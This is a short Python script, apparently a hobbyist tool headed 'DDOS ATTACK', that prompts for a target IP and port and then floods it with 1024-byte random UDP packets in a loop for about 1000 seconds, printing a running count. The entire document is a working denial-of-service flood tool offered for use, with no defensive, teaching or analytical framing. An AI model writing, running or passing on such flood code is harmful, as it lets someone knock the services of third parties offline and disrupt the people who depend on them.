import sys,random,time,os,socket

s=socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
byte=random._urandom(1024)
os.system('clear')
os.system('figlet DDOS ATTACK')
print('************************CODE BY TEST************************')
ip=input('[*]Enter the IP or url:')
port=input('[*]Enter the PORT(80):')
times=1000
timeout=time.time()+int(times)
send=0
while True:
    try:
        if time.time() > timeout:
            break
        else:
            pass
        send+=1
        s.sendto(byte,(ip,int(port)))
        print(str(send) + " TIMES DDOS")
    except KeyboardInterrupt:
        exit()
